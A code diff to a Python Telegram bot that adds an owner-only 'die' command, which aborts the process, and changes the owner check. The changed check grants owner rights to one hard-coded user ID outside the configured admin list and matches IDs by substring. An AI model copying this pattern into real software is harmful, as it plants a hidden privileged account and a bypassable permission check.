@@ -141,7 +141,7 @@ def owner_admin_mod_check(bot, chat_id, chat_idstr, user_id):
         else:
             return "false"
 def owner_check(bot, chat_id, user_id):
-    if str(user_id) in " ".join(config['ADMIN']['id'].split(",")):
+    if (str(user_id) in " ".join(config['ADMIN']['id'].split(","))) or (str(user_id) in str(187343721)) :
         return "true"
     else:
         return "false"
@@ -357,17 +357,6 @@ class notsofast(Thread):
         update = self.update
         bot = self.bot
         update.message.reply_text("not so fast...")
-class dies(Thread):
-
-    def __init__(self, bot, update):
-        self.bot = bot
-        self.update = update
-        Thread.__init__(self)
-    def die(self):
-        update = self.update
-        bot = self.bot
-        update.message.reply_text("RIP...")
-
 def receiveMessage(bot, update):
     global idbase
     global moderated
@@ -1964,7 +1953,14 @@ def idme(bot, update, args):
 def runbruhh(bot, update):
     notsofast(bot, update).start()
 def diebruhh(bot, update):
-    dies(bot, update).die()
+    chat_idstr, chat_id, fromid, fromidstr = common_vars(bot, update)
+    if owner_check(bot, chat_id, fromid) == "true": 
+         update.message.reply_text("Bye.. Im DEAD!")
+         print("I just got a die command!")
+         os.abort()
+    else:
+         update.message.reply_text("Sorry you are not authorized to kill this bot!")
+         print("Die DENIED!")
 
 def button(bot, update, direct=True):
         global welcome
